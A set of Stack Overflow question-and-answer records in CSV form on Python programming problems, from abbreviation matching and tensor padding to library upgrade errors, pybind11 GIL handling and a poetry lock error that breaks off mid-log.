"72766397","1","Abbreviation similarity between strings","<p>I have a use case in my project where I need to compare a <code>key</code>-string with a lot many strings for similarity. If this value is greater than a certain threshold, I consider those strings &quot;similar&quot; to my <code>key</code> and based on that list, I do some further calculations / processing.</p>
<p>I have been exploring fuzzy matching string similarity stuff, which use <code>edit distance</code> based algorithms like &quot;levenshtein, jaro and jaro-winkler&quot; similarities.</p>
<p>Although they work fine, I want to have a higher similarity score if one string is &quot;abbreviation&quot; of another. Is there any algorithm/ implementation I can use for this.</p>
<p>Note:</p>
<pre><code>language: python3 
packages explored: fuzzywuzzy, jaro-winkler
</code></pre>
<p>Example:</p>
<pre><code>using jaro_winkler similarity:

&gt;&gt;&gt; jaro.jaro_winkler_metric(&quot;wtw&quot;, &quot;willis tower watson&quot;)
0.7473684210526316
&gt;&gt;&gt; jaro.jaro_winkler_metric(&quot;wtw&quot;, &quot;willistowerwatson&quot;)
0.7529411764705883

using levenshtein similarity:

&gt;&gt;&gt; fuzz.ratio(&quot;wtw&quot;, &quot;willis tower watson&quot;)
27
&gt;&gt;&gt; fuzz.ratio(&quot;wtw&quot;, &quot;willistowerwatson&quot;)
30
&gt;&gt;&gt; fuzz.partial_ratio(&quot;wtw&quot;, &quot;willistowerwatson&quot;)
67
&gt;&gt;&gt; fuzz.QRatio(&quot;wtw&quot;, &quot;willistowerwatson&quot;)
30
</code></pre>
<p>In these kind of cases, I want score to be higher (&gt;90%) if possible. I'm ok with few false positives as well, as they won't cause too much issue with my further calculations. But if we match s1 and s2 such that s1 is fully contained in s2 (or vice versa), their similarity score should be much higher.</p>
<h2>Edit: Further Examples for my Use-Case</h2>
<p>For me, spaces are redundant. That means, <code>wtw</code> is considered abbreviation for &quot;willistowerwatson&quot; and &quot;willis tower watson&quot; alike.</p>
<p>Also, <code>stove</code> is a valid abbreviation for &quot;STack OVErflow&quot; or &quot;STandardOVErview&quot;</p>
<p>A simple algo would be to start with 1st char of smaller string and see if it is present in the larger one. Then check for 2nd char and so on until the condition satisfies that 1st string is fully contained in 2nd string. This is a 100% match for me.</p>
<p>Further examples like <code>wtwx</code> to &quot;willistowerwatson&quot; could give a score of, say 80% (this can be based on some edit distance logic). Even if I can find a package which gives either <code>True</code> or <code>False</code> for abbreviation similarity would also be helpful.</p>
","72870998","<p>You can use a recursive algorithm, similar to sequence alignment. Just don't give penalty for shifts (as they are expected in abbreviations) but give one for mismatch in first characters.</p>
<p>This one should work, for example:</p>
<pre><code>def abbreviation(abr,word,penalty=1):
    if len(abr)==0:
        return 0
    elif len(word)==0:
        return penalty*len(abr)*-1
    elif abr[0] == word[0]:
        if len(abr)&gt;1:
            return 1 + max(abbreviation(abr[1:],word[1:]),
                           abbreviation(abr[2:],word[1:])-penalty)
        else:
            return 1 + abbreviation(abr[1:],word[1:])
    else:
        return abbreviation(abr,word[1:])

def compute_match(abbr,word,penalty=1):
    score = abbreviation(abbr.lower(),
                         word.lower(),
                         penalty)
    if abbr[0].lower() != word[0].lower(): score-=penalty
    
    score = score/len(abbr)

    return score


print(compute_match(&quot;wtw&quot;, &quot;willis tower watson&quot;))
print(compute_match(&quot;wtwo&quot;, &quot;willis tower watson&quot;))
print(compute_match(&quot;stove&quot;, &quot;Stackoverflow&quot;))
print(compute_match(&quot;tov&quot;, &quot;Stackoverflow&quot;))
print(compute_match(&quot;wtwx&quot;, &quot;willis tower watson&quot;))
</code></pre>
<p>The output is:</p>
<pre><code>1.0
1.0
1.0
0.6666666666666666
0.5
</code></pre>
<p>Indicating that <code>wtw</code> and <code>wtwo</code> are perfectly valid abbreviations for <code>willistowerwatson</code>, that <code>stove</code> is a valid abbreviation of <code>Stackoverflow</code> but not <code>tov</code>, which has the wrong first character.
And <code>wtwx</code> is only partially valid abbreviation for <code>willistowerwatson</code> beacuse it ends with a character that does not occur in the full name.</p>
"
"73269000","1","Efficient logic to pad tensor","<p>I'm trying to pad a tensor of some shape such that the total memory used by the tensor is always a multiple of 512
E.g.
Tensor shape 16x1x1x4 of type SI32 (Multiply by 4 to get total size)</p>
<pre><code>The total elements are 16x4x1x1 = 64
Total Memory required 64x**4** = 256 (Not multiple of 512)
Padded shape would be 32x1x1x4 = 512
</code></pre>
<p>The below logic works for the basic shape but breaks with a shape e.g. <code>16x51x1x4 SI32</code> or something random say <code>80x240x1x1 U8</code>
The padding logic goes like below</p>
<pre><code>from functools import reduce

DATA_TYPE_MULTIPLYER = 2 # This would change at runtime with different type e.g. 8 with U8 16 with F16 32 with SI32

ALIGNMENT = 512 #Always Constant
CHAR_BIT = 8    # Always Const for given fixed Arch

def approachOne(tensor):
    totalElements = reduce((lambda x, y: x * y), tensor)
    totalMemory = totalElements * DATA_TYPE_MULTIPLYER
    
    divisor = tensor[1] * tensor[2] * tensor[3]
    tempDimToPad = totalElements/divisor
    orgDimToPad = totalElements/divisor
    while (True):
        if ((tempDimToPad * divisor * DATA_TYPE_MULTIPLYER) % ALIGNMENT == 0):
            return int(tempDimToPad - orgDimToPad)
        tempDimToPad = tempDimToPad + 1;
    
def getPadding(tensor):
    totalElements = reduce((lambda x, y: x * y), tensor)
    totalMemory = totalElements * DATA_TYPE_MULTIPLYER
    newSize = totalMemory + (ALIGNMENT - (totalMemory % ALIGNMENT))
    newTotalElements = (newSize * CHAR_BIT) / (CHAR_BIT * DATA_TYPE_MULTIPLYER)
    
    # Any DIM can be padded, using first for now
    paddingValue = tensor[0] 
    padding =  int(((newTotalElements * paddingValue) / totalElements) - paddingValue)
    return padding
    
tensor = [11, 7, 3, 5]
print(getPadding(tensor))
print(approachOne(tensor))
</code></pre>
<p><code>tensorflow</code> package may help here but I'm originally coding in C++ so just posting in python with a minimal working example
Any help is appreciated, thanks</p>
<p><strong>Approach 1</strong>
the brute force approach is to keep on incrementing across any chosen dimension by 1 and check if the totalMemory is multiple of 512. The brute force approach works but doesn't give the minimal padding and bloats the tensor</p>
<p><strong>Updating the conditions</strong>
Initially the approach was to pad across the first dim. Since always padding the first dimension my not be the best solution, just getting rid of this constraint</p>
","73336113","<p>If you want the total memory to be a multiple of <code>512</code> then the number of elements in the tensor must be a multiple of <code>512 // DATA_TYPE_MULTIPLIER</code>, e.g. <code>128</code> in your case. Whatever that number is, it will have a prime factorization of the form <code>2**n</code>. The number of elements in the tensor is given by <code>s[0]*s[1]*...*s[d-1]</code> where <code>s</code> is a sequence containing the shape of the tensor and <code>d</code> is an integer, the number of dimensions. The product <code>s[0]*s[1]*...*s[d-1]</code> also has some prime factorization and it is a multiple of <code>2**n</code> if and only if it contains these prime factors. I.e. the task is to pad the individual dimensions <code>s[i]</code> such that the resulting prime factorization of the product <code>s[0]*s[1]*...*s[d-1]</code> contains <code>2**n</code>.</p>
<p>If the goal is to reach a minimum possible size of the padded tensor, then one can simply iterate through all multiples of the given target number of elements to find the first one that can be satisfied by padding (increasing) the individual dimensions of the tensor <sup>(1)</sup>. A dimension must be increased as long as it contains at least one prime factor that is not contained in the target multiple size. After all dimensions have been increased such that their prime factors are contained in the target multiple size, one can check the resulting size of the candidate shape: if it matches the target multiple size we are done; if its prime factors are a strict subset of the target multiple prime factors, we can add the missing prime factors to any of the dimensions (e.g. the first); otherwise, we can use the excess prime factors to store the candidate shape for a future (larger) multiplier. The first such future multiplier then marks an upper boundary for the iteration over all possible multipliers, i.e. the algorithm will terminate. However, if the candidate shape (after adjusting all the dimensions) has an excess of prime factors w.r.t. the target multiple size as well as misses some other prime factors, the only way is to iterate over all possible padded shapes with size bound by the target multiple size.</p>
<p>The following is an example implementation:</p>
<pre class=""lang-py prettyprint-override""><code>from collections import Counter
import itertools as it
import math
from typing import Iterator, Sequence


def pad(shape: Sequence[int], target: int) -&gt; tuple[int,...]:
    &quot;&quot;&quot;Pad the given `shape` such that the total number of elements
       is a multiple of the given `target`.
    &quot;&quot;&quot;
    size = math.prod(shape)
    if size % target == 0:
        return tuple(shape)

    target_prime_factors = get_prime_factors(target)

    solutions: dict[int, tuple[int,...]] = {}  # maps `target` multipliers to corresponding padded shapes

    for multiplier in it.count(math.ceil(size / target)):

        if multiplier in solutions:
            return solutions[multiplier]

        prime_factors = [*get_prime_factors(multiplier), *target_prime_factors]
        
        def good(x):
            return all(f in prime_factors for f in get_prime_factors(x))

        candidate = list(shape)
        for i, x in enumerate(candidate):
            while not good(x):
                x += 1
            candidate[i] = x

        if math.prod(candidate) == multiplier*target:
            return tuple(candidate)

        candidate_prime_factor_counts = Counter(f for x in candidate for f in get_prime_factors(x))
        target_prime_factor_counts = Counter(prime_factors)

        missing = target_prime_factor_counts - candidate_prime_factor_counts
        excess = candidate_prime_factor_counts - target_prime_factor_counts

        if not excess:
            return (
                candidate[0] * math.prod(k**v for k, v in missing.items()),
                *candidate[1:],
            )
        elif not missing:
            solutions[multiplier * math.prod(k**v for k, v in excess.items())] = tuple(candidate)
        else:
            for padded_shape in generate_all_padded_shapes(shape, bound=multiplier*target):
                padded_size = math.prod(padded_shape)
                if padded_size == multiplier*target:
                    return padded_shape
                elif padded_size % target == 0:
                    solutions[padded_size // target] = padded_shape


def generate_all_padded_shapes(shape: Sequence[int], *, bound: int) -&gt; Iterator[tuple[int,...]]:
    head, *tail = shape
    if bound % head == 0:
        max_value = bound // math.prod(tail)
    else:
        max_value = math.floor(bound / math.prod(tail))
    for x in range(head, max_value+1):
        if tail:
            yield from ((x, *other) for other in generate_all_padded_shapes(tail, bound=math.floor(bound/x)))
        else:
            yield (x,)


def get_prime_factors(n: int) -&gt; list[int]:
    &quot;&quot;&quot;From: https://stackoverflow.com/a/16996439/3767239
       Replace with your favorite prime factorization method.
    &quot;&quot;&quot;
    primfac = []
    d = 2
    while d*d &lt;= n:
        while (n % d) == 0:
            primfac.append(d)  # supposing you want multiple factors repeated
            n //= d
        d += 1
    if n &gt; 1:
       primfac.append(n)
    return primfac
</code></pre>
<p>Here are a few examples:</p>
<pre class=""lang-py prettyprint-override""><code>pad((16, 1, 1), 128) = (128, 1, 1)
pad((16, 51, 1, 4), 128) = (16, 52, 1, 4)
pad((80, 240, 1, 1), 128) = (80, 240, 1, 1)
pad((3, 5, 7, 11), 128) = (3, 5, 8, 16)
pad((3, 3, 3, 1), 128) = (8, 4, 4, 1)
pad((7, 7, 7, 7), 128) = (7, 8, 8, 8)
pad((9, 9, 9, 9), 128) = (10, 10, 10, 16)
</code></pre>
<hr />
<p><sub><strong>Footnotes:</strong></sub>
<sub>(1) In fact, we need to find the roots of the polynomial <code>(s[0]+x[0])*(s[1]+x[1])*...*(s[d-1]+x[d-1]) - multiple*target</code> for <code>x[i] &gt;= 0</code> over the domain of integers. However, I am not aware of any algorithm to solve this problem.</sub></p>
"
"72133316","1","libssl.so.1.1: cannot open shared object file: No such file or directory","<p>I've just updated to <strong>Ubuntu 22.04 LTS</strong> and my libs using <strong>OpenSSL</strong> just stopped working.
Looks like Ubuntu switched to the version 3.0 of OpenSSL.</p>
<p>For example, <strong>poetry</strong> stopped working:</p>
<pre><code>Traceback (most recent call last):
  File &quot;/home/robz/.local/bin/poetry&quot;, line 5, in &lt;module&gt;
    from poetry.console import main
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/__init__.py&quot;, line 1, in &lt;module&gt;
    from .application import Application
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/application.py&quot;, line 7, in &lt;module&gt;
    from .commands.about import AboutCommand
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/commands/__init__.py&quot;, line 4, in &lt;module&gt;
    from .check import CheckCommand
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/commands/check.py&quot;, line 2, in &lt;module&gt;
    from poetry.factory import Factory
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/factory.py&quot;, line 18, in &lt;module&gt;
    from .repositories.pypi_repository import PyPiRepository
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/repositories/pypi_repository.py&quot;, line 33, in &lt;module&gt;
    from ..inspection.info import PackageInfo
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/inspection/info.py&quot;, line 25, in &lt;module&gt;
    from poetry.utils.env import EnvCommandError
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/utils/env.py&quot;, line 23, in &lt;module&gt;
    import virtualenv
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/__init__.py&quot;, line 3, in &lt;module&gt;
    from .run import cli_run, session_via_cli
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/run/__init__.py&quot;, line 11, in &lt;module&gt;
    from ..seed.wheels.periodic_update import manual_upgrade
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/__init__.py&quot;, line 3, in &lt;module&gt;
    from .acquire import get_wheel, pip_wheel_env_run
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/acquire.py&quot;, line 12, in &lt;module&gt;
    from .bundle import from_bundle
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/bundle.py&quot;, line 4, in &lt;module&gt;
    from .periodic_update import periodic_update
  File &quot;/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/periodic_update.py&quot;, line 10, in &lt;module&gt;
    import ssl
  File &quot;/home/robz/.pyenv/versions/3.9.10/lib/python3.9/ssl.py&quot;, line 98, in &lt;module&gt;
    import _ssl             # if we can't import it, let the error propagate
ImportError: libssl.so.1.1: cannot open shared object file: No such file or directory
</code></pre>
<p>Is there an easy fix ? For example, having <code>libssl.so.1.1</code> available without having to uninstall OpenSSL 3 (I don't know if it's even possible).</p>
","72633324","<p>This fixes it (a problem with packaging in 22.04):</p>
<pre><code>wget http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb

sudo dpkg -i libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb
</code></pre>
<p>PS: If the link is expired, check <a href=""http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/?C=M;O=D"" rel=""noreferrer"">http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/?C=M;O=D</a> for a valid one.</p>
<p>Current version is: libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb</p>
"
"72325242","1","type object 'Base' has no attribute '_decl_class_registry'","<p>I am upgrading a library to a recent version of SQLAlchemy and I am getting this error</p>
<blockquote>
<p>type object 'Base' has no attribute '_decl_class_registry'</p>
</blockquote>
<p>On line</p>
<pre><code>Base = declarative_base(metadata=metadata)

Base._decl_class_registry
</code></pre>
<p>How can I solve this?</p>
","72738555","<p>Had the same problem. Because of my upgrade of sqlalchemy looks like there is a change in the base code.</p>
<p>use this instead to accomplish the same</p>
<pre><code>Base.registry._class_registry.values()
</code></pre>
"
"73924768","1","AttributeError: module 'flax' has no attribute 'nn'","<p>I'm trying to run <a href=""https://github.com/google-research/google-research/tree/master/regnerf"" rel=""noreferrer"">RegNeRF</a>, which requires flax. On installing the latest version of flax==0.6.0, I got an error stating flax has no attribute optim. <a href=""https://stackoverflow.com/a/73501131/3337089"">This answer</a> suggested to downgrade flax to 0.5.1. On doing that, now I'm getting the error <code>AttributeError: module 'flax' has no attribute 'nn'</code></p>
<p>I could not find any solutions on the web for this error. Any help is appreciated.</p>
<p>I'm using ubuntu 20.04</p>
","73926711","<p>The <code>flax.optim</code> module has been moved to <code>optax</code> as of flax version 0.6.0; see <a href=""https://flax.readthedocs.io/en/latest/advanced_topics/optax_update_guide.html#replacing-flax-optim-with-optax"" rel=""nofollow noreferrer"">Upgrading my Codebase to Optax</a> for information on how to migrate your code. If you're using external code that imports <code>flax.optim</code> and can't update these references, you'll have to install flax version 0.5.3 or older.</p>
<p>Regarding <code>flax.nn</code>: this module was replaced by <code>flax.linen</code> in flax version 0.4.0. See <a href=""https://flax.readthedocs.io/en/latest/advanced_topics/linen_upgrade_guide.html?highlight=flax.nn#upgrading-my-codebase-to-linen"" rel=""nofollow noreferrer"">Upgrading my Codebase to Linen</a> for information on this migration. If you're using external code that imports <code>flax.nn</code> and can't update these references, you'll have to install flax version 0.3.6 or older.</p>
"
"71530764","1","Binance order: Timestamp for this request was 1000ms ahead of the server's time","<p>I am writing some Python code to create an order with the Binance API:</p>
<pre><code>from binance.client import Client

client = Client(API_KEY, SECRET_KEY)

client.create_order(symbol='BTCUSDT',
                    recvWindow=59999, #The value can't be greater than 60K
                    side='BUY',
                    type='MARKET',
                    quantity = 0.004)
</code></pre>
<p>Unfortunately I get the following error message:</p>
<pre><code>&quot;BinanceAPIException: APIError(code=-1021): Timestamp for this request was 1000ms ahead of the server's time.&quot;
</code></pre>
<p>I already checked the difference (in miliseconds) between the Binance server time and my local time:</p>
<pre><code>import time
import requests
import json
url = &quot;https://api.binance.com/api/v1/time&quot;
t = time.time()*1000
r = requests.get(url)

result = json.loads(r.content)

print(int(t)-result[&quot;serverTime&quot;]) 

OUTPUT: 6997
</code></pre>
<p>It seems that the recvWindow of 60000 is still not sufficient (but it may not exceed 60K). I still get the same error.
Does anybody know how I can solve this issue?</p>
<p>Many thanks in advance!</p>
","72763542","<p>Probably the PC's time is out of sync.</p>
<p>You can do it using Windows -&gt; Setting-&gt; Time &amp; Language -&gt; Date &amp; Time -&gt; 'Sync Now'.</p>
<p>Screenshot:</p>
<p><img src=""https://i.stack.imgur.com/kGIcr.png"" alt=""I share the picture as well"" /></p>
"
"73997582","1","Should I repeat parent class __init__ arguments in the child class's __init__, or using **kwargs instead","<p>Imagine a base class that you'd like to inherit from:</p>
<pre class=""lang-py prettyprint-override""><code>class Shape:
    def __init__(self, x: float, y: float):
        self.x = x
        self.y = y
</code></pre>
<p>There seem to be two common patterns of handling a parent's kwargs in a child class's <code>__init__</code> method.</p>
<p>You can restate the parent's interface completely:</p>
<pre class=""lang-py prettyprint-override""><code>class Circle(Shape):
    def __init__(self, x: float, y: float, radius: float):
        super().__init__(x=x, y=y)
        self.radius = radius
</code></pre>
<p>Or you can specify only the part of the interface which is specific to the child, and hand the remaining kwargs to the parent's <code>__init__</code>:</p>
<pre class=""lang-py prettyprint-override""><code>class Circle(Shape):
    def __init__(self, radius: float, **kwargs):
        super().__init__(**kwargs)
        self.radius = radius
</code></pre>
<p>Both of these seem to have pretty big drawbacks, so I'd be interested to hear what is considered standard or best practice.</p>
<p>The &quot;restate the interface&quot; method is appealing in toy examples like you commonly find in <a href=""https://rhettinger.wordpress.com/category/inheritance/"" rel=""noreferrer"">discussions of Python inheritance</a>, but what if we're subclassing something with a really complicated interface, like <code>pandas.DataFrame</code> or <code>logging.Logger</code>?</p>
<p>Also, if the parent interface changes, I have to remember to change all of my child class's interfaces to match, type hints and all. Not very DRY.</p>
<p>In these cases, you're almost certain to go for the <code>**kwargs</code> option.</p>
<p>But the <code>**kwargs</code> option leaves the user unsure about which arguments are actually required.</p>
<p>In the toy example above, a user might naively write:</p>
<pre class=""lang-py prettyprint-override""><code>circle = Circle()  # Argument missing for parameter &quot;radius&quot;
</code></pre>
<p>Their IDE (or mypy or Pyright) is being helpful and saying that the <code>radius</code> parameter is required.</p>
<pre class=""lang-py prettyprint-override""><code>circle = Circle(radius=5)
</code></pre>
<p>The IDE (or type checker) is now happy, but the code won't actually run:</p>
<pre><code>Traceback (most recent call last):
  File &quot;foo.py&quot;, line 13, in &lt;module&gt;
    circle = Circle(radius=5)
  File &quot;foo.py&quot;, line 9, in __init__
    super().__init__(**kwargs)
TypeError: Shape.__init__() missing 2 required positional arguments: 'x' and 'y'
</code></pre>
<p>So I'm stuck with a choice between writing out the parent interface multiple times, and not being warned by my IDE when I'm using a child class incorrectly.</p>
<p>What to do?</p>
<h3>Research</h3>
<p><a href=""https://github.com/python/mypy/issues/10079"" rel=""noreferrer"">This mypy issue</a> is loosely related to this.</p>
<p><a href=""https://www.reddit.com/r/learnpython/comments/omssdu/how_do_i_pass_init_arguments_to_a_subclass/"" rel=""noreferrer"">This reddit thread</a> has a good rehearsal of the relevant arguments for/against each approach I outline.</p>
<p><a href=""https://stackoverflow.com/questions/14626279/inheritance-best-practice-args-kwargs-or-explicitly-specifying-parameters"">This SO question</a> is maybe a duplicate of this one. Does the fact I'm talking about <code>__init__</code> make any difference though?</p>
<p>I've found <a href=""https://stackoverflow.com/q/60952945/2071807"">a real duplicate</a>, although the answer is a bit esoteric and doesn't seem like it would qualify as best, or normal, practice.</p>
","74027245","<p>If the parent class has required (positional) arguments (as your <code>Shape</code> class does), then I'd argue that you must include those arguments in the <code>__init__</code> of the child (<code>Circle</code>) for the sake of being able to pass around &quot;shape-like&quot; instances and be sure that a <code>Circle</code> will behave like any other shape.  So this would be your <code>Circle</code> class:</p>
<pre><code>class Shape:
    def __init__(x: float, y: float):
        self.x = x
        self.y = y


class Circle(Shape):
    def __init__(x: float, y: float, radius: float):
        super().__init__(x=x, y=y)
        self.radius = radius


# The expectation is that this should work with all instances of `Shape`
def move_shape(shape: Shape, x: float, y: float):
    shape.x = x
    shape.y = y
</code></pre>
<p>However if the parent class is using <em>optional</em> kwargs, that's where stuff gets tricky.  You shouldn't have to define <code>colour: str</code> on your <code>Circle</code> class just because <code>colour</code> is an optional argument for <code>Shape</code>.  It's up to the developer using your <code>Circle</code> class to know the interface of all shapes and if need be, interrogate the code and note that <code>Circle</code> can accept <code>colour=green</code> as it passes <code>**kwargs</code> to its parent constructor:</p>
<pre><code>class Shape:
    def __init__(x: float, y: float, colour: str = &quot;black&quot;):
        self.x = x
        self.y = y
        self.colour = colour 


class Circle(Shape):
    def __init__(x: float, y: float, radius: float, **kwargs):
        super().__init__(x=x, y=y, **kwargs)
        self.radius = radius


def move_shape(shape: Shape, x: float, y: float):
    shape.x = x
    shape.y = y


def colour_shape(shape: Shape, colour: str):
    shape.colour = colour
</code></pre>
<p>Generally my attitude is that a docstring exists to explain <em>why</em> something is written the way it is, not <em>what</em> it's doing.  That should be clear from the code.  So, if your <code>Circle</code> requires an <code>x</code> and <code>y</code> parameter for use in the parent class, then it should say as much in the signature.  If the parent class has <em>optional</em> requirements, then <code>**kwargs</code> is sufficient in the child class and it's incumbent upon the developer to interrogate <code>Circle</code> and <code>Shape</code> to see what the options are.</p>
"
"72876146","1","Handling GIL when calling python lambda from C++ function","<h2>The question</h2>
<p>Is pybind11 somehow magically doing the work of <code>PyGILState_Ensure()</code> and <code>PyGILState_Release()</code>? And if not, how should I do it?</p>
<h2>More details</h2>
<p><a href=""https://stackoverflow.com/questions/42521830/call-a-python-function-from-c-using-pybind11"">There</a> <a href=""https://stackoverflow.com/questions/45054860/extending-c-to-python-using-pybind11"">are</a> <a href=""https://stackoverflow.com/questions/70603855/how-to-set-python-function-as-callback-for-c-using-pybind11"">many</a> questions regarding passing a python function to C++ as a callback using pybind11, but I haven't found one that explains the use of the GIL with pybind11.</p>
<p>The <a href=""https://docs.python.org/2/c-api/init.html#non-python-created-threads"" rel=""nofollow noreferrer"">documentation</a> is pretty clear about the GIL:</p>
<blockquote>
<p>[...] However, when threads are created from C (for example by a third-party library with its own thread management), they don’t hold the GIL, nor is there a thread state structure for them.</p>
<p>If you need to call Python code from these threads (often this will be part of a callback API provided by the aforementioned third-party library), you must first register these threads with the interpreter by creating a thread state data structure, then acquiring the GIL, and finally storing their thread state pointer, before you can start using the Python/C API.</p>
</blockquote>
<p>I can easily bind a C++ function that takes a callback:</p>
<pre class=""lang-cpp prettyprint-override""><code>py::class_&lt;SomeApi&gt; some_api(m, &quot;SomeApi&quot;); 
some_api
    .def(py::init&lt;&gt;())
    .def(&quot;mode&quot;, &amp;SomeApi::subscribe_mode, &quot;Subscribe to 'mode' updates.&quot;);
</code></pre>
<p>With the corresponding C++ function being something like:</p>
<pre class=""lang-cpp prettyprint-override""><code>void subscribe_mode(const std::function&lt;void(Mode mode)&gt;&amp; mode_callback);
</code></pre>
<p>But because pybind11 cannot know about the threading happening in my C++ implementation, I suppose it cannot handle the GIL for me. Therefore, if <code>mode_callback</code> is called by a thread created from C++, does that mean that I should write a wrapper to <code>SomeApi::subscribe_mode</code> that uses <code>PyGILState_Ensure()</code> and <code>PyGILState_Release()</code> for each call?</p>
<p><a href=""https://stackoverflow.com/a/60417929/1368342"">This answer</a> seems to be doing something similar, but still slightly different: instead of &quot;taking the GIL&quot; when calling the callback, it seems like it &quot;releases the GIL&quot; when starting/stopping the thread. Still I'm wondering if there exists something like <code>py::call_guard&lt;py::gil_scoped_acquire&gt;()</code> that would do exactly what I (believe I) need, i.e. wrapping my callback with <code>PyGILState_Ensure()</code> and <code>PyGILState_Release()</code>.</p>
","72933328","<h2>In general</h2>
<p>pybind11 tries to do the Right Thing and the GIL will be held when pybind11 knows that it is calling a python function, or in C++ code that is called from python via pybind11. The only time that you need to explicitly acquire the GIL when using pybind11 is when you are writing C++ code that accesses python and will be called from other C++ code, or if you have explicitly dropped the GIL.</p>
<h2>std::function wrapper</h2>
<p>The wrapper for <code>std::function</code> always acquires the GIL via <code>gil_scoped_acquire</code> <a href=""https://github.com/pybind/pybind11/blob/f9f00495a3f0ef6037c215c42bd2d919590ff11f/include/pybind11/functional.h#L100"" rel=""nofollow noreferrer"">when the function is called</a>, so your python callback will always be called with the GIL held, regardless which thread it is called from.</p>
<p>If <code>gil_scoped_acquire</code> is called from a thread that does not currently have a GIL thread state associated with it, then it will <a href=""https://github.com/pybind/pybind11/blob/f9f00495a3f0ef6037c215c42bd2d919590ff11f/include/pybind11/gil.h#L64"" rel=""nofollow noreferrer"">create a new thread state</a>. As a side effect, if nothing else in the thread acquires the thread state and increments the reference count, then once your function exits the GIL will be released by the destructor of <code>gil_scoped_acquire</code> and then <a href=""https://github.com/pybind/pybind11/blob/f9f00495a3f0ef6037c215c42bd2d919590ff11f/include/pybind11/gil.h#L101"" rel=""nofollow noreferrer"">it will delete the thread state associated with that thread</a>.</p>
<p>If you're only calling the function once from another thread, this isn't a problem. If you're calling the callback often, it will create/delete the thread state a lot, which probably isn't great for performance. It would be better to cause the thread state to be created when your thread starts (or even easier, start the thread from Python and call your C++ code from python).</p>
"
"71558637","1","Poetry fails with ""Retrieved digest for package not in poetry.lock metadata""","<p>We're trying to merge and old branch in a project and when trying to build a docker image, poetry seems to fail for some reason that I don't understand.</p>
<p>I'm not very familiar with poetry, as I've only used requirements.txt for dependencies up to now, so I'm fumbling a bit on what's going on.</p>
<p>The error that I'm getting (part of the playbook that builds the image on the server) is this:</p>
<pre><code>       &quot;Installing dependencies from lock file&quot;,
        &quot;&quot;,
        &quot;Package operations: 16 installs, 14 updates, 0 removals&quot;,
        &quot;&quot;,
        &quot;  • Updating importlib-metadata (4.8.3 -&gt; 2.0.0)&quot;,
        &quot;  • Updating pyparsing (3.0.6 -&gt; 2.4.7)&quot;,
        &quot;  • Updating six (1.16.0 -&gt; 1.15.0)&quot;,
        &quot;&quot;,
        &quot;  RuntimeError&quot;,
        &quot;&quot;,
        &quot;  Retrieved digest for link six-1.15.0.tar.gz(sha256:30639c035cdb23534cd4aa2dd52c3bf48f06e5f4a941509c8bafd8ce11080259) not in poetry.lock metadata ['30639c035cdb23534cd4aa2dd52c3bf48f06e5f4a941509c8bafd8ce11080259', '8b74bedcbbbaca38ff6d7491d76f2b06b3592611af620f8426e82dddb04a5ced']&quot;,
        &quot;&quot;,
        &quot;  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links&quot;,
        &quot;      111│ &quot;,
        &quot;      112│         if links and not selected_links:&quot;,
        &quot;      113│             raise RuntimeError(&quot;,
        &quot;      114│                 \&quot;Retrieved digest for link {}({}) not in poetry.lock metadata {}\&quot;.format(&quot;,
        &quot;    → 115│                     link.filename, h, hashes&quot;,
        &quot;      116│                 )&quot;,
        &quot;      117│             )&quot;,
        &quot;      118│ &quot;,
        &quot;      119│         return selected_links&quot;,
        &quot;&quot;,
        &quot;&quot;,
        &quot;  RuntimeError&quot;,
        &quot;&quot;,
        &quot;  Retrieved digest for link pyparsing-2.4.7.tar.gz(sha256:c203ec8783bf771a155b207279b9bccb8dea02d8f0c9e5f8ead507bc3246ecc1) not in poetry.lock metadata ['c203ec8783bf771a155b207279b9bccb8dea02d8f0c9e5f8ead507bc3246ecc1', 'ef9d7589ef3c200abe66653d3f1ab1033c3c419ae9b9bdb1240a85b024efc88b']&quot;,
        &quot;&quot;,
        &quot;  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links&quot;,
        &quot;      111│ &quot;,
        &quot;      112│         if links and not selected_links:&quot;,
        &quot;      113│             raise RuntimeError(&quot;,
        &quot;      114│                 \&quot;Retrieved digest for link {}({}) not in poetry.lock metadata {}\&quot;.format(&quot;,
        &quot;    → 115│                     link.filename, h, hashes&quot;,
        &quot;      116│                 )&quot;,
        &quot;      117│             )&quot;,
        &quot;      118│ &quot;,
        &quot;      119│         return selected_links&quot;,
        &quot;&quot;,
        &quot;&quot;,
        &quot;  RuntimeError&quot;,
        &quot;&quot;,
        &quot;  Retrieved digest for link importlib_metadata-2.0.0.tar.gz(sha256:77a540690e24b0305878c37ffd421785a6f7e53c8b5720d211b211de8d0e95da) not in poetry.lock metadata ['77a540690e24b0305878c37ffd421785a6f7e53c8b5720d211b211de8d0e95da', 'cefa1a2f919b866c5beb7c9f7b0ebb4061f30a8a9bf16d609b000e2dfaceb9c3']&quot;,
        &quot;&quot;,
        &quot;  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links&quot;,
        &quot;      111│ &quot;,
